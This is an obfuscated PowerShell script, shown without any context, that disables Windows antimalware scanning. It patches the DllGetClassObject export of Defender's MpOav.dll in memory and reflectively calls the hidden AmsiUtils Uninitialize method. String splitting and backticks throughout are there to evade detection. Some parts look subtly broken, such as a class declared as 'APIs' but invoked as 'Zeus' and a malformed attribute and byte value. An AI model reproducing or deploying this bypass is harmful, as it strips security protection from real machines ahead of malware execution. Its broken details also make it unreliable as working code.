$Zeus = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    ['D'+llImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    ['D'+llImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    ['D'+llImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@
A+'dd'-T+'y'+'p'+'e' $Zeus
$z1 = "0"
$z2 = "x"
$z3 = "B"
$z4 = "8"
$zzz1 = $z1+$z1+$z3+$z4
$zzz2 = "0x57"
$zzz3 = "0x00"
$zzz4 = "0x07"
$zzz5 = "0x80"
$zzz6 = "0xC3"
$PiZaCh = [Byte[]] ($zzz1,$zzz2,$zzz3,$zzz4,+$zzz5,+$zzz6)
$LLz7 = [Zeus]::LoadLibrary("MpOav.dll")
$addy = [Zeus]::GetProcAddress($LLz7,"DllGetClassObject")
$sz = 0
[Zeus]::VirtualProtect($addy, [uint32]6, 0x40, [ref]$sz)
[s`ys`TEM.rUnti`ME.iNtE`rOPsE`RvIcEs.M`aRS`Hal]::CoPy($PiZaCh, 0, $addy, 6)
$tec = [Ref].aSSembly.gettYPE('Sys'+'tem.Ma'+'nag'+'eme'+'nt.'+'Autom'+'ati'+'on.A'+'m'+'s'+'i'+'U'+'t'+'i'+'l'+'s')
$ezi = $tec.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$ezi.Invoke($tec,$null)